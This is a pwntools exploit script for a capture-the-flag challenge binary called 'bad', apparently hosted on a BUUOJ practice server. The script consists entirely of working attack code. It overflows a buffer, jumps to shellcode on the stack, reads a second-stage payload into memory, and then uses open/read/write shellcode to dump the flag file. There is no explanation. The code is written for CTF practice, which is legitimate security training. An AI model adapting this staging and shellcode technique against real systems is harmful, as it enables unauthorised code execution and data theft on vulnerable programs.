import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bad')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bad')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27654)
			elf=ELF('./bad')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')


		io.recv()
		shell='''
		mov rsi, 0x123000
		xor rdi, rdi
		mov edx, 0x1000
		xor rax, rax
		syscall
		jmp rsi
		'''
		# gdb.attach(io)
		# pause()
		pop_rdi=0x0000000000400b13

		pay=asm(shell).ljust(0x28,'\x00')+p64(0x0000000000400a01)+asm('sub rsp,0x30;jmp rsp')
		io.send(pay)
		io.send(asm(shellcraft.linux.open('./flag')+shellcraft.linux.read(3,0x123400,0x30)+shellcraft.linux.write(1,0x123400,0x30)))




		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue